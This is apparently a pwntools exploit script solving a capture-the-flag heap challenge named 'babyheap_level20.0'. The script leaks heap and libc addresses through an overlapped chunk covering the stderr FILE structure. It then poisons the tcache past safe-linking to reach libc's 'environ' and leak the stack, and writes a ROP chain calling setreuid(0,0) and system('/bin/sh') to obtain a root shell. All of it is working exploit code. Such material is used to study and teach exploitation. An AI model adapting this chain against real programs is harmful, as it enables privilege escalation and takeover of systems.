from pwn import *

context.arch = 'amd64'
BINARY = "/challenge/babyheap_level20.0"
p = process(BINARY)
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("/challenge/toddlerone_level1.1", gdbscript='continue')
 
libc = ELF(p.libc.path)

def tcache_mangle(b:int, mangle:int)->bytes:
    return p64(b ^ mangle)

def alloc_to_6(loc:int, heap_mangle:int, size:int):
    size_in_bytes = str(size).encode('utf-8')
    p.sendline(b'malloc')
    p.sendline(b'3')
    p.sendline(size_in_bytes)
    p.sendline(b'malloc')
    p.sendline(b'4')
    p.sendline(size_in_bytes)
    p.sendline(b'malloc')
    p.sendline(b'5')
    p.sendline(size_in_bytes)
    p.sendline(b'malloc')
    p.sendline(b'6')
    p.sendline(size_in_bytes)
    p.sendline(b'free')
    p.sendline(b'6')
    p.sendline(b'free')
    p.sendline(b'5')

    # overwrite size of chunk 4
    payload = b'\x00' * (size) + b'\xa1\x02'
    p.sendline(b'safe_read')
    p.sendline(b'3')
    p.send(payload)

    p.sendline(b'free')
    p.sendline(b'4')

    # re-allocate to overlapp the file struct area
    p.sendline(b'malloc')
    p.sendline(b'4')
    p.sendline(b'664') # 0x2a1 ^ 0x1 - 8 = max size to alloc this chunk

    # write to chunk 4 to overwrite *next of chunk 5
    payload = b'\x00' * (size) + p64(size+8+1) + tcache_mangle(loc, heap_mangle)
    p.sendline(b'safe_read')
    p.sendline(b'4')
    p.send(payload)

    p.sendline(b'malloc')
    p.sendline(b'5')
    p.sendline(size_in_bytes)
    p.sendline(b'malloc')
    p.sendline(b'6')
    p.sendline(size_in_bytes)

# prepare chunk 2
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'173')
p.sendline(b'malloc')
p.sendline(b'2')
p.sendline(b'173')

# re-alloc chunk 2 so that we can leak heap
p.sendline(b'free')
p.sendline(b'2')
p.sendline(b'malloc')
p.sendline(b'2')
p.sendline(b'173')

# leak heap addr
p.sendline(b'safe_write')
p.clean(1)
p.sendline(b'2')
p.recvuntil(b'\n')
p.recvuntil(b'\n')
heap_mangle = unpack(p.recv()[:5], 'all')
print(f'heap_mangle = {hex(heap_mangle)}')

# overwrite size of chunk 2
payload = b'\x00' * (184) + b'\xa1\x02'
p.sendline(b'safe_read')
p.sendline(b'1')
p.send(payload)

p.sendline(b'free')
p.sendline(b'2')

# re-allocate to overlapp the file struct area
p.sendline(b'malloc')
p.sendline(b'2')
p.sendline(b'664') # 0x2a1 ^ 0x1 - 8 = max size to alloc this chunk

# leak file sturct and hence the libc addr
p.sendline(b'safe_write')
p.clean(1)
p.sendline(b'2')
p.recvuntil(b'\n')
p.recvuntil(b'\n')
stderr = p.recv()[296: 296+8]
libc_base = unpack(stderr, 'all') - libc.sym['_IO_2_1_stderr_']
libc.address = libc_base
print(f'libc_base = {hex(libc_base)}')
rop = ROP(libc)

# prepare rop chain
bin_sh = next(libc.search(b'/bin/sh'))
rop.setreuid(0, 0)
rop.system(bin_sh)
rop_chain = rop.chain()

# leak stack address
environ_to_sip = 288
environ_to_alloc_0 = 696
environ = libc.sym["environ"]
print(f'environ = {hex(environ)}')

alloc_to_6(environ, heap_mangle, 184)

p.sendline(b'safe_write')
p.clean(1)
p.sendline(b'6')
p.recvuntil(b'\n')
p.recvuntil(b'\n')
stack_leak = unpack(p.recv()[:8], 'all')
print(f'stack_leak = {hex(stack_leak)}')
sip = stack_leak - environ_to_sip
print(f'sip = {hex(sip)}')
alloc = stack_leak - environ_to_alloc_0

# overwrite rbp (sip is not alligned chunk in safe-link context)
# rbp = 1 when quit
alloc_to_6(sip-8, heap_mangle, 88)
payload = p64(1) + rop_chain
p.sendline(b'safe_read')
p.sendline(b'6')
p.send(payload)

p.sendline(b'quit')

p.interactive()